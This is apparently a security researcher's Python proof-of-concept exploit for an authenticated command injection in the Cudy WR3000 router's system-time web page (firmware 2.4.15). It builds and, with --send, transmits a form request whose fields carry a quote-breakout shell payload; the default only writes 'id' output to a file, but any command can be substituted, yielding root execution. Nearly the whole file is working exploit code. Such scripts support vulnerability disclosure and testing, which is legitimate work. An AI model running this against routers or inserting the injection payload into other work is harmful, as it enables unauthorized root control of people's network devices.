#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 ShibbityShwab
"""
systime_rce_poc.py - dry-run-first PoC for the authenticated command injection in the
Cudy WR3000 v2.0 LuCI system-time page (2.4.15; fixed in 2.5.24).

AUTHORIZED RESEARCH ONLY. Run this only against a router you own or have explicit written
permission to test, and only after logging in yourself. The default payload is benign
(id > /tmp/systime-poc.txt). See ../writeups/systime-command-injection.md.

Usage:
    python3 systime_rce_poc.py --demo
    python3 systime_rce_poc.py --url http://<your router> \
        --cookie 'sysauth=<session>' --token <csrf>            # dry run
    python3 systime_rce_poc.py --url http://<your router> \
        --cookie 'sysauth=<session>' --token <csrf> --send

Standard library only.
"""
import argparse
import sys
import urllib.parse
import urllib.request

DEFAULT_PAYLOAD = "'; id > /tmp/systime-poc.txt; #"
DEMO_URL = "http://192.0.2.10"   # RFC 5737 documentation address


def build_body(token: str, payload: str) -> bytes:
    return urllib.parse.urlencode({
        "token": token,
        "cbi.submit": "1",
        "cbid.system.ntp.current": payload,
        "timeclock": payload,
    }).encode()


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    ap.add_argument("--demo", action="store_true",
                    help="print the request shape with placeholders; no network")
    ap.add_argument("--url", help="base URL of your router, e.g. http://<router-lan-ip>")
    ap.add_argument("--cookie", help="authenticated Cookie header value, e.g. 'sysauth=...'")
    ap.add_argument("--token", help="CSRF token from the systime page")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD,
                    help="shell injection payload (default: benign id redirect)")
    ap.add_argument("--send", action="store_true",
                    help="actually send the request (default is dry run)")
    args = ap.parse_args()

    payload = args.payload
    if not payload.startswith("'"):
        sys.exit("[!] payload should start with a single quote to break out of the date string")

    if args.demo:
        print("[*] demo mode: no network, no device contact")
        print(f"[*] POST {DEMO_URL}/cgi-bin/luci/admin/system/systime")
        print("[*] Cookie: sysauth=<your session cookie>")
        print("[*] form body:")
        for k, v in urllib.parse.parse_qsl(build_body("<csrf>", payload).decode()):
            print(f"      {k}={v}")
        print("[*] expected result on a vulnerable 2.4.15 unit: /tmp/systime-poc.txt exists")
        print("[*] expected result on 2.5.24+: no file, quotes stripped")
        return

    if not args.url:
        sys.exit("[!] --url is required (or use --demo); use your own router only")
    if not args.cookie or not args.token:
        sys.exit("[!] --cookie and --token are required; log in to your own unit first")

    url = args.url.rstrip("/") + "/cgi-bin/luci/admin/system/systime"
    body = build_body(args.token, payload)
    req = urllib.request.Request(url, data=body, method="POST",
                                 headers={"Cookie": args.cookie,
                                          "Content-Type": "application/x-www-form-urlencoded"})
    print(f"[*] POST {url}")
    print("[*] payload:", payload)
    if not args.send:
        print("[*] dry run: request built but not sent. Add --send to send it.")
        return

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            print(f"[+] HTTP {resp.status}, {len(resp.read())} bytes")
    except Exception as exc:  # noqa: BLE001 - report the failure and stop
        sys.exit(f"[!] request failed: {exc}")
    print("[*] check /tmp/systime-poc.txt on YOUR device; it should contain uid=0(root)")


if __name__ == "__main__":
    main()